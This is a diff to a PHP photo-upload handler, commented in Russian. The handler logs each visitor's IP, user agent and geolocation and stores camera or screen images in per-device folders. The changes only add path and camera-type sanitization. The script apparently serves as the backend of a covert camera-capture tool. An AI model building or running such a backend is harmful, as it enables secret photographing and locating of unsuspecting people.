@@ -17,6 +17,21 @@ function getUserAgent() {
     return isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown';
 }
 
+function sanitizePathSegment($value, $fallback) {
+    $value = is_string($value) ? trim($value) : '';
+    $value = preg_replace('/[^a-zA-Z0-9_-]/', '_', $value);
+    $value = trim($value, '_-');
+    if ($value === '') {
+        return $fallback;
+    }
+    return substr($value, 0, 80);
+}
+
+function sanitizeCameraType($value) {
+    $allowed = array('front', 'back', 'gallery', 'screen');
+    return in_array($value, $allowed, true) ? $value : 'front';
+}
+
 // Функция для получения геолокации по IP адресу
 function getGeoLocation($ip) {
     // Пропускаем локальные IP адреса
@@ -96,11 +111,12 @@ $userAgent = getUserAgent();
 $geo = getGeoLocation($clientIP);
 
 // Определяем тип камеры (front или back)
-$cameraType = isset($_POST['camera_type']) ? $_POST['camera_type'] : 'front';
+$cameraType = sanitizeCameraType(isset($_POST['camera_type']) ? $_POST['camera_type'] : 'front');
 
 // Создаем уникальный идентификатор (IP или телефон)
 // Если есть параметр device_id в POST, используем его, иначе используем IP
-$deviceId = isset($_POST['device_id']) ? $_POST['device_id'] : preg_replace('/[^a-zA-Z0-9]/', '_', $clientIP);
+$defaultDeviceId = preg_replace('/[^a-zA-Z0-9_-]/', '_', $clientIP);
+$deviceId = sanitizePathSegment(isset($_POST['device_id']) ? $_POST['device_id'] : '', $defaultDeviceId);
 
 if (!empty($_POST['cat'])) {
     // Логируем получение фотографии
@@ -115,7 +131,7 @@ if (!empty($_POST['cat'])) {
 
 // Путь к папке Photo с подпапкой для устройства
 // Можно изменить базовую папку здесь, если нужно (по умолчанию: 'Photo')
-$basePhotoDir = 'Photo';  // Можно изменить на другую папку при необходимости
+$basePhotoDir = __DIR__ . '/Photo';  // Можно изменить на другую папку при необходимости
 $photoDir = $basePhotoDir . '/' . $deviceId . '/';
 
 // Создаем директорию, если она не существует
